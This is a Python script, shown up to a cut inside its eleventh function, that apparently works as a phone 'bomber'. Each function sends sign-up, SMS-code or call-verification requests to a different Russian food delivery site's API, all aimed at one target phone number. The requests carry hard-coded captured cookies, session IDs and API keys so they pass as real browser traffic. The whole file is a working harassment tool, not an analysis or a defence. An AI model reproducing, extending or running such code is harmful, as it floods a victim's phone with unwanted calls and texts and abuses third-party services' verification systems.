import requests
from pprint import pprint
PHONE = ""
DEBUG_MODE = 1
def serv1():
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.5',
            # 'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Referer': 'https://tomatsemga.ru/neftekamsk/nabory',
            'baggage': 'sentry-environment=production,sentry-public_key=6d8491d39322eaeadd4ecd8d3fccc5e6,sentry-trace_id=eac258d7fc2d4ebab2b8ce7ea5d44217,sentry-org_id=4504076812025856,sentry-transaction=%2F%3Acity%2F%3Acatalog(.*)*,sentry-sampled=false,sentry-sample_rand=0.6481413378971757,sentry-sample_rate=0.25',
            'content-type': 'application/json',
            'sentry-trace': 'eac258d7fc2d4ebab2b8ce7ea5d44217-a5a9ea70c4a3b8b3-0',
            'sitenew': '1',
            'uuid': 'ac968370-4357-b0c2-1692-886521b2207d',
            'x-api-key': '728468',
            'x-brand-id': '1',
            'x-platform': 'ssr',
            'Origin': 'https://tomatsemga.ru',
            'Connection': 'keep-alive',
            # 'Cookie': 'uuid=ac968370-4357-b0c2-1692-886521b2207d; encodedIP=dKlKmBfXaAnAmTmQxCfFaAiGmB; i18n_redirected=ru; theme=light; city_id=1; department_id=0; delivery_type=delivery; is_city-confirmed=true; __session__id=209782266169de848224ca52.13250902; _ym_uid=1776190594962356958; _ym_d=1776190594; tmr_lvid=f2af60dd8bd205468bf2e75171ae3112; tmr_lvidTS=1776190594283; _ym_isad=2; domain_sid=HD8_F2MVFAdGJwqALnY9r%3A1776190595509; tmr_detect=0%7C1776190597830',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Priority': 'u=0',
        }

        json_data = {
            'phone': PHONE[1:],
            'verify_type': 'call',
        }

        response = requests.post('https://tomatsemga.ru/api/user/register', headers=headers, json=json_data)
        print(f"serv1 - {response.status_code}")
        if DEBUG_MODE:
            print(response.text)
    except:
        print("serv1 - error")
def serv2():
    try:
        cookies = {
        'PHPSESSID': 'D6jy0b5et4XMzOd3Pfyl6nEYgHoWLcti',
        'BITRIX_SM_GUEST_ID': '9997268',
        'BITRIX_SM_SALE_UID': '30d55355ae31bf2400171fc22c745cd2',
        'tmr_lvid': 'ad7484de010daeeef60b5adc6aa211a2',
        'tmr_lvidTS': '1773754265042',
        '_ym_uid': '1773754265303821514',
        '_ym_visorc': 'w',
        'BITRIX_CONVERSION_CONTEXT_s1': '%7B%22ID%22%3A12%2C%22EXPIRE%22%3A1773773940%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D',
        '_ym_isad': '2',
        'domain_sid': 'zgUD5bGrrpXNKfRVSNr2N%3A1773754266288',
        '_ym_d': '1773754267',
        'BITRIX_SM_LAST_VISIT': '17.03.2026%2018%3A31%3A07',
        'tmr_detect': '0%7C1773754268138',
        }

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://lv-pizza.ru',
            'priority': 'u=1, i',
            'referer': 'https://lv-pizza.ru/?srsltid=AfmBOoqScpWn1AFIYx5SxAMJjtIHEQ1tIaTk-CDdK_dwjR8HQ7zM47zr',
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
            'x-requested-with': 'XMLHttpRequest',
            # 'cookie': 'PHPSESSID=D6jy0b5et4XMzOd3Pfyl6nEYgHoWLcti; BITRIX_SM_GUEST_ID=9997268; BITRIX_SM_SALE_UID=30d55355ae31bf2400171fc22c745cd2; tmr_lvid=ad7484de010daeeef60b5adc6aa211a2; tmr_lvidTS=1773754265042; _ym_uid=1773754265303821514; _ym_visorc=w; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A12%2C%22EXPIRE%22%3A1773773940%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ym_isad=2; domain_sid=zgUD5bGrrpXNKfRVSNr2N%3A1773754266288; _ym_d=1773754267; BITRIX_SM_LAST_VISIT=17.03.2026%2018%3A31%3A07; tmr_detect=0%7C1773754268138',
        }

        data = f'phone=%2B{PHONE[0]}+({PHONE[1:4]})+{PHONE[4:7]}-{PHONE[7:9]}-{PHONE[9:11]}&action=send&call=Y&zone=Asia%2FYekaterinburg'
        response = requests.post('https://lv-pizza.ru/ajax/sms_new.php', cookies=cookies, headers=headers, data=data)
        print(f"serv2 - {response.status_code}")
        if DEBUG_MODE:
            print(response.text)
    except:
        print(f"serv2 - error")
def serv3():
    try:
        cookies = {
        '_yasc': 'q61SnbQS2bO/XNPk7P2m0NPsFA+s2b+1EtaR+UsgzY6wPC5hbkwRp8oLhtTOA8w=',
        '_ga': 'GA1.2.585135803.1773755323',
        '_gid': 'GA1.2.1050422689.1773755324',
        '_gat_gtag_UA_222882258_1': '1',
        '_ym_uid': '1773755324716996701',
        '_ym_d': '1773755324',
        '_ym_isad': '2',
        '_ym_visorc': 'b',
        'analytic_id': '1773755324564593',
        '_ga_40TSJRCTXV': 'GS2.1.s1773755323$o1$g1$t1773755330$j53$l0$h0',
        }
        headers = {
            'accept': 'application/json',
            'accept-language': 'ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
            'content-type': 'application/json',
            'origin': 'https://papajohns.ru',
            'priority': 'u=1, i',
            'referer': 'https://papajohns.ru/',
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
            # 'cookie': '_yasc=q61SnbQS2bO/XNPk7P2m0NPsFA+s2b+1EtaR+UsgzY6wPC5hbkwRp8oLhtTOA8w=; _ga=GA1.2.585135803.1773755323; _gid=GA1.2.1050422689.1773755324; _gat_gtag_UA_222882258_1=1; _ym_uid=1773755324716996701; _ym_d=1773755324; _ym_isad=2; _ym_visorc=b; analytic_id=1773755324564593; _ga_40TSJRCTXV=GS2.1.s1773755323$o1$g1$t1773755330$j53$l0$h0',
        }
        json_data = {
            'phone': f'+{PHONE}',
            'platform': 'web',
            'city_id': '261',
            'lang': 'ru',
        }
        response = requests.post('https://api.papajohns.ru/v2/user/signup-by-phone', cookies=cookies, headers=headers, json=json_data)
        print(f"serv3 - {response.status_code}")
        if DEBUG_MODE:
            print(response.text)
    except:
        print(f"serv3 - error")
def serv4():
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
            'Accept': 'application/json, text/plain, */*, application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.5',
            # 'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Content-Type': 'application/json',
            'Origin': 'https://tochka-vkusa.ru',
            'Connection': 'keep-alive',
            'Referer': 'https://tochka-vkusa.ru/',
            # 'Cookie': '_ym_uid=1773770465544724876; _ym_d=1773770465; mgo_uid=E3LBuwBm18yu2IWziXDl; mgo_cnt=3; _ym_isad=2; _ym_visorc=w; mgo_sid=60gbtd6qdp11003blexv',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Priority': 'u=0',
        }

        json_data = {
            'phone': f"+{PHONE[0]} ({PHONE[1:4]}) {PHONE[4:7]}-{PHONE[7:9]}-{PHONE[9:11]}",
            'password': 'qwerty121',
            'passwordReply': 'qwerty121',
        }

        response = requests.put('https://tochka-vkusa.ru/api/registration', headers=headers, json=json_data)
        if response.status_code !=200:
            headers = {
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
                'Accept': 'application/json, text/plain, */*, application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.5',
                # 'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Content-Type': 'application/json',
                'Origin': 'https://tochka-vkusa.ru',
                'Connection': 'keep-alive',
                'Referer': 'https://tochka-vkusa.ru/',
                # 'Cookie': '_ym_uid=1773770465544724876; _ym_d=1773770465; mgo_uid=E3LBuwBm18yu2IWziXDl; mgo_cnt=3; _ym_isad=2',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Priority': 'u=0',
            }

            json_data = {
                'phone': f"+{PHONE[0]} ({PHONE[1:4]}) {PHONE[4:7]}-{PHONE[7:9]}-{PHONE[9:11]}",
            }
            response = requests.put('https://tochka-vkusa.ru/api/restore', headers=headers, json=json_data)
        print(f"serv4 - {response.status_code}")
        if DEBUG_MODE:
            print(response.text)
    except:
        print(f"serv4 - error")
def serv5():
    try:
        cookies = {
            '_ym_uid': '1773840971236173969',
            '_ym_d': '1773840971',
            '_ym_isad': '2',
            'connect.sid': 's%3AGTUjtP2Ic03GN9ZbAUvtnGr5P8btsOy6.oiAFDpJVxEBPUL4fP%2FxZS4C33Ma8kzfuc2qhLt1gA0k',
            '_ym_visorc': 'w',
        }

        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
            'Accept': 'application/json, text/plain, */*, application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.5',
            # 'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Content-Type': 'application/json',
            'Origin': 'https://arigatosurgut.com',
            'Connection': 'keep-alive',
            'Referer': 'https://arigatosurgut.com/',
            # 'Cookie': '_ym_uid=1773840971236173969; _ym_d=1773840971; _ym_isad=2; connect.sid=s%3AGTUjtP2Ic03GN9ZbAUvtnGr5P8btsOy6.oiAFDpJVxEBPUL4fP%2FxZS4C33Ma8kzfuc2qhLt1gA0k; _ym_visorc=w',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Priority': 'u=0',
        }

        json_data = {
            'phone': f"+{PHONE[0]} ({PHONE[1:4]}) {PHONE[4:7]}-{PHONE[7:9]}-{PHONE[9:11]}",
            'password': 'qwerty',
            'passwordReply': 'qwerty',
        }

        response = requests.put('https://arigatosurgut.com/api/registration', cookies=cookies, headers=headers, json=json_data)
        print(f"serv5 - {response.status_code}")
        if DEBUG_MODE:
            print(response.text)
    except:
        print(f"serv5 - error")
def serv6():
    try:
        cookies = {
            'uuid': '73980358-807f-1b98-0c35-cef10a3b8d14',
            'encodedIP': 'dKlKmBfXaAnAmThBrIfFoLrTaA',
            'i18n_redirected': 'ru',
            'theme': 'light',
            'city_id': '1',
            'department_id': '0',
            'delivery_type': 'delivery',
            '_ym_uid': '1773846500943348776',
            '_ym_d': '1773846500',
            '_ym_isad': '2',
            '__session__id': '165570024269babfe430f0c0.21211349',
        }

        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.5',
            # 'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Referer': 'https://tichpizza.ru/krasnoyarsk',
            'baggage': 'sentry-environment=production,sentry-public_key=6d8491d39322eaeadd4ecd8d3fccc5e6,sentry-trace_id=4a16bbd621ce4e2589fbaa08b87cd91c,sentry-org_id=4504076812025856,sentry-transaction=%2F%3Acity%2F%3Acatalog(.*)*,sentry-sampled=false,sentry-sample_rand=0.7503387247392285,sentry-sample_rate=0.25',
            'content-type': 'application/json',
            'sentry-trace': '4a16bbd621ce4e2589fbaa08b87cd91c-9da4f11f0e469a3b-0',
            'sitenew': '1',
            'uuid': '73980358-807f-1b98-0c35-cef10a3b8d14',
            'x-api-key': '12773774',
            'x-brand-id': '1',
            'x-platform': 'ssr',
            'Origin': 'https://tichpizza.ru',
            'Connection': 'keep-alive',
            # 'Cookie': 'uuid=73980358-807f-1b98-0c35-cef10a3b8d14; encodedIP=dKlKmBfXaAnAmThBrIfFoLrTaA; i18n_redirected=ru; theme=light; city_id=1; department_id=0; delivery_type=delivery; _ym_uid=1773846500943348776; _ym_d=1773846500; _ym_isad=2; __session__id=165570024269babfe430f0c0.21211349',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Priority': 'u=0',
            # Requests doesn't support trailers
            # 'TE': 'trailers',
        }

        json_data = {
            'phone': PHONE[1:],
            'verify_type': 'call',
        }

        response = requests.post('https://tichpizza.ru/api/user/register', cookies=cookies, headers=headers, json=json_data)
        print(f"serv6 - {response.status_code}")
        if DEBUG_MODE:
            print(response.text)
    except:
        print(f"serv6 - error")
def serv7():
    try:
        cookies = {
        '_GPSLSC': 'Qr8wCGAZr1!3N5KWYuEGf!vp531Cn8Kr!L0_pR2dQbZ!lS8zMAdnCG!Qr0yfDXPyx!uh8fSmytpE!mwFhmvD-YP!f9prmllK9_!RDsctNFT8b',
        'PHPSESSID': 'j9cHjQnauakoNQQBmSWoGjgHDPUMFbaQ',
        'BITRIX_SM_TZ': 'Asia/Yekaterinburg',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2026-03-19%2019%3A04%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.pizzaldo.ru%2Fcatalog%2Fpizza%2F%3Fysclid%3Dmmxjkqz4o5327456236%7C%7C%7Crf%3Dhttps%3A%2F%2Fyandex.ru%2F',
        'sbjs_first_add': 'fd%3D2026-03-19%2019%3A04%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.pizzaldo.ru%2Fcatalog%2Fpizza%2F%3Fysclid%3Dmmxjkqz4o5327456236%7C%7C%7Crf%3Dhttps%3A%2F%2Fyandex.ru%2F',
        'sbjs_current': 'typ%3Dreferral%7C%7C%7Csrc%3Dyandex.ru%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Ctrm%3D%28none%29',
        'sbjs_first': 'typ%3Dreferral%7C%7C%7Csrc%3Dyandex.ru%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Ctrm%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F146.0.0.0%20Safari%2F537.36%20Edg%2F146.0.0.0',
        'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.pizzaldo.ru%2Fcatalog%2Fpizza%2F%3Fysclid%3Dmmxjkqz4o5327456236',
        't_source': 'referral%7Cyandex.ru',
        '_ga': 'GA1.2.80662755.1773929089',
        '_gid': 'GA1.2.1299857072.1773929089',
        '_gat': '1',
        '_dc_gtm_test': '1',
        '_ym_uid': '1773929089882178216',
        '_ym_d': '1773929089',
        '_ym_isad': '2',
        '_ym_visorc': 'w',
        '_ga_LTKVQQPHG2': 'GS2.2.s1773929089$o1$g0$t1773929089$j60$l0$h0',
        }

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.pizzaldo.ru',
            'priority': 'u=1, i',
            'referer': 'https://www.pizzaldo.ru/catalog/pizza/?ysclid=mmxjkqz4o5327456236',
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
            'x-requested-with': 'XMLHttpRequest',
            # 'cookie': '_GPSLSC=Qr8wCGAZr1!3N5KWYuEGf!vp531Cn8Kr!L0_pR2dQbZ!lS8zMAdnCG!Qr0yfDXPyx!uh8fSmytpE!mwFhmvD-YP!f9prmllK9_!RDsctNFT8b; PHPSESSID=j9cHjQnauakoNQQBmSWoGjgHDPUMFbaQ; BITRIX_SM_TZ=Asia/Yekaterinburg; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-03-19%2019%3A04%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.pizzaldo.ru%2Fcatalog%2Fpizza%2F%3Fysclid%3Dmmxjkqz4o5327456236%7C%7C%7Crf%3Dhttps%3A%2F%2Fyandex.ru%2F; sbjs_first_add=fd%3D2026-03-19%2019%3A04%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.pizzaldo.ru%2Fcatalog%2Fpizza%2F%3Fysclid%3Dmmxjkqz4o5327456236%7C%7C%7Crf%3Dhttps%3A%2F%2Fyandex.ru%2F; sbjs_current=typ%3Dreferral%7C%7C%7Csrc%3Dyandex.ru%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Ctrm%3D%28none%29; sbjs_first=typ%3Dreferral%7C%7C%7Csrc%3Dyandex.ru%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F146.0.0.0%20Safari%2F537.36%20Edg%2F146.0.0.0; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.pizzaldo.ru%2Fcatalog%2Fpizza%2F%3Fysclid%3Dmmxjkqz4o5327456236; t_source=referral%7Cyandex.ru; _ga=GA1.2.80662755.1773929089; _gid=GA1.2.1299857072.1773929089; _gat=1; _dc_gtm_test=1; _ym_uid=1773929089882178216; _ym_d=1773929089; _ym_isad=2; _ym_visorc=w; _ga_LTKVQQPHG2=GS2.2.s1773929089$o1$g0$t1773929089$j60$l0$h0',
        }

        params = {
            'action': 'auth',
        }
        data = {
            'CSRF': '',
            'ACTION': 'REGISTER',
            'MODE': 'PHONE',
            'PHONE': f"+{PHONE[0]} {PHONE[1:4]} {PHONE[4:7]} {PHONE[7:9]} {PHONE[9:11]}",
            'PASSWORD': 'qwerty',
            'PASSWORD2': 'qwerty',
        }

        response = requests.post('https://www.pizzaldo.ru/catalog/pizza/', params=params, cookies=cookies, headers=headers, data=data)
        print(f"serv7 - {response.status_code}")
        if DEBUG_MODE:
            print(response.text)
    except:
        print(f"serv7 - error")
def serv8():
    try:
        cookies = {
        'uuid': '556a6caa-fdd1-f002-9704-1be2051fb550',
        'encodedIP': 'dKlKmBfXaAnAmTbSlOfFoLrTgN',
        'i18n_redirected': 'ru',
        'theme': 'light',
        'city_id': '60',
        'department_id': '0',
        'delivery_type': 'delivery',
        '_ym_uid': '1775135708723440957',
        '_ym_d': '1775135708',
        'tmr_lvid': '636973f61f188fa24003f59cc8b6b744',
        'tmr_lvidTS': '1775135707609',
        '_ym_isad': '2',
        '__session__id': '6460009169ce6bd93d5cb0.50399316',
        'domain_sid': 'O4UN968KOKvx2u9-VTP2j%3A1775135708859',
        'is_city-confirmed': 'true',
        'tmr_detect': '0%7C1775135710170',
        }

        headers = {
            'accept': 'application/json',
            'accept-language': 'ru',
            'baggage': 'sentry-environment=production,sentry-public_key=6d8491d39322eaeadd4ecd8d3fccc5e6,sentry-trace_id=dc9b701a50aa4f74885b469dcaeffca2,sentry-org_id=4504076812025856,sentry-transaction=%2F%3Acity%2F%3Acatalog(.*)*,sentry-sampled=false,sentry-sample_rand=0.6053204409537386,sentry-sample_rate=0.25',
            'content-type': 'application/json',
            'origin': 'https://rolik-sushi.ru',
            'priority': 'u=1, i',
            'referer': 'https://rolik-sushi.ru/omsk?utm_term=goulash_direct&etext=2202.r2YfmGR1fzjzhdvQX-PAOfcPRJujYlPm980bRweI2-_YaCVYhCpRplzYjJdq2_GfcmV6anp4ZHl4c25hdm1mcA.94bac8f389da08993f7428b51f2e2e673001c29c&yclid=2968623337557458943&ybaip=1',
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sentry-trace': 'dc9b701a50aa4f74885b469dcaeffca2-a871caad08907b7e-0',
            'sitenew': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
            'uuid': '556a6caa-fdd1-f002-9704-1be2051fb550',
            'x-api-key': '9649494',
            'x-brand-id': '1',
            'x-platform': 'ssr',
            # 'cookie': 'uuid=556a6caa-fdd1-f002-9704-1be2051fb550; encodedIP=dKlKmBfXaAnAmTbSlOfFoLrTgN; i18n_redirected=ru; theme=light; city_id=60; department_id=0; delivery_type=delivery; _ym_uid=1775135708723440957; _ym_d=1775135708; tmr_lvid=636973f61f188fa24003f59cc8b6b744; tmr_lvidTS=1775135707609; _ym_isad=2; __session__id=6460009169ce6bd93d5cb0.50399316; domain_sid=O4UN968KOKvx2u9-VTP2j%3A1775135708859; is_city-confirmed=true; tmr_detect=0%7C1775135710170',
        }

        json_data = {
            'phone': PHONE[1:],
            'verify_type': 'call',
        }

        response = requests.post('https://rolik-sushi.ru/api/user/register', cookies=cookies, headers=headers, json=json_data)
        print(f"serv8 - {response.status_code}")
        if DEBUG_MODE:
            print(response.text)
    except:
        print(f"serv8 - error")
def serv9():
    try:
        cookies = {
            '_smartomato_session': 'e5741b51c37e5905536a5f893c353d0b',
        }

        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en',
            # 'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Content-Type': 'application/json',
            'X-Smartomato-Session-Id': 'e5741b51c37e5905536a5f893c353d0b',
            'X-Smartomato-Organization-Id': '45229',
            'X-Smartomato-Full-Basket-Payload': 'true',
            'X-Smartomato-Request-Tag': '37e6b7#1',
            'Origin': 'https://food-boom.ru',
            'Connection': 'keep-alive',
            'Referer': 'https://food-boom.ru/',
            # 'Cookie': '_smartomato_session=e5741b51c37e5905536a5f893c353d0b',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site',
            # Requests doesn't support trailers
            # 'TE': 'trailers',
        }

        json_data = {
            'fcm_token': None,
            'phone': f"+{PHONE[0]} ({PHONE[1:4]}) {PHONE[4:7]}-{PHONE[7:9]}-{PHONE[9:11]}",
            'g-recaptcha-response': None,
            'alternative_method': False,
        }

        response = requests.post('https://smartomato.ru/account/session', headers=headers, json=json_data)
        print(f"serv9 - {response.status_code}")
        if DEBUG_MODE:
            print(response.text)
    except:
        print(f"serv9 - error")
def serv10():
    try:
        cookies = {
            'uuid': '055561d5-1dca-d5c3-9cf8-2d6a13b1d252',
            'encodedIP': 'dKlKmBfXaAnApFgItGuUlOiG',
            'i18n_redirected': 'ru',
            'theme': 'light',
            'city_id': '1',
            'department_id': '0',
            'delivery_type': 'delivery',
            '_ym_uid': '1775136658773893202',
            '_ym_d': '1775136658',
            '_ym_isad': '2',
            'is_city-confirmed': 'true',
            '__session__id': '103197001069ce6f8f3d6318.27721499',
        }

        headers = {
            'accept': 'application/json',
            'accept-language': 'ru',
            'baggage': 'sentry-environment=production,sentry-public_key=6d8491d39322eaeadd4ecd8d3fccc5e6,sentry-trace_id=abc6aa0e2efa455bbb35d58c807ea34f,sentry-org_id=4504076812025856,sentry-transaction=%2F%3Acity%2F%3Acatalog(.*)*,sentry-sampled=true,sentry-sample_rand=0.19615489869961866,sentry-sample_rate=0.25',
            'content-type': 'application/json',
            'origin': 'https://barashka55.ru',
            'priority': 'u=1, i',
            'referer': 'https://barashka55.ru/omsk/shaurma?ysclid=mnhij4wxte268772195',
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sentry-trace': 'abc6aa0e2efa455bbb35d58c807ea34f-aeea611756be9fb8-1',
            'sitenew': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
            'uuid': '055561d5-1dca-d5c3-9cf8-2d6a13b1d252',
            'x-api-key': '9300034',
            'x-brand-id': '1',
            'x-platform': 'ssr',
            # 'cookie': 'uuid=055561d5-1dca-d5c3-9cf8-2d6a13b1d252; encodedIP=dKlKmBfXaAnApFgItGuUlOiG; i18n_redirected=ru; theme=light; city_id=1; department_id=0; delivery_type=delivery; _ym_uid=1775136658773893202; _ym_d=1775136658; _ym_isad=2; is_city-confirmed=true; __session__id=103197001069ce6f8f3d6318.27721499',
        }

        json_data = {
            'phone': PHONE[1:],
            'verify_type': 'call',
        }

        response = requests.post('https://barashka55.ru/api/user/register', cookies=cookies, headers=headers, json=json_data)
        print(f"serv10 - {response.status_code}")
        if DEBUG_MODE:
            print(response.text)
    except:
        print(f"serv10 - error")
def serv11():
    try:
        cookies = {
            '__js_p_': '579,1800,0,0,0',
            '__jhash_': '229',
            '__jua_': 'Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F146.0.0.0%20Safari%2F537.36%20Edg%2F146.0.0.0',
            '__hash_': '3dd857e7e18f7371e7a2131a6bb5f378',
            '__lhash_': '1938cf45cb9e4face979b5d8ed62628d',
            'NEXT_LOCALE': 'ru',
            'utm_source': 'yandex.ru',
            'utm_medium': 'organic',
            'utm_campaign': 'yandex.ru',
            'sessionId': '748295b6-1c9d-41c2-893c-eb8d785757d7',
            '_ym_uid': '1775138586991868164',
            '_ym_d': '1775138586',
            '_ym_isad': '2',
            '_ym_visorc': 'w',
            'city': '%D0%92%D0%BB%D0%B0%D0%B4%D0%B8%D0%B2%D0%BE%D1%81%D1%82%D0%BE%D0%BA',
        }

        headers = {
            'accept': 'application/json',
            'accept-language': 'ru',
            'authcode': '',
            'content-type': 'application/json',
            'lang': 'ru',
            'origin': 'https://sicilian-pizzeria.ru',
            'priority': 'u=1, i',
            'referer': 'https://sicilian-pizzeria.ru/',
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sessionid': '748295b6-1c9d-41c2-893c-eb8d785757d7',
            'timezone': 'Asia/Yekaterinburg',
            'uber-trace-id': '5dce35069c427a2763d75b7168f8fae0:33ad96c7928d9baa:0:1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
            # 'cookie': '__js_p_=579,1800,0,0,0; __jhash_=229; __jua_=Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F146.0.0.0%20Safari%2F537.36%20Edg%2F146.0.0.0; __hash_=3dd857e7e18f7371e7a2131a6bb5f378; __lhash_=1938cf45cb9e4face979b5d8ed62628d; NEXT_LOCALE=ru; utm_source=yandex.ru; utm_medium=organic; utm_campaign=yandex.ru; sessionId=748295b6-1c9d-41c2-893c-eb8d785757d7; _ym_uid=1775138586991868164; _ym_d=1775138586; _ym_isad=2; _ym_visorc=w; city=%D0%92%D0%BB%D0%B0%D0%B4%D0%B8%D0%B2%D0%BE%D1%81%D1%82%D0%BE%D0%BA',
        }

        json_data = {
            'phone': PHONE,
        }

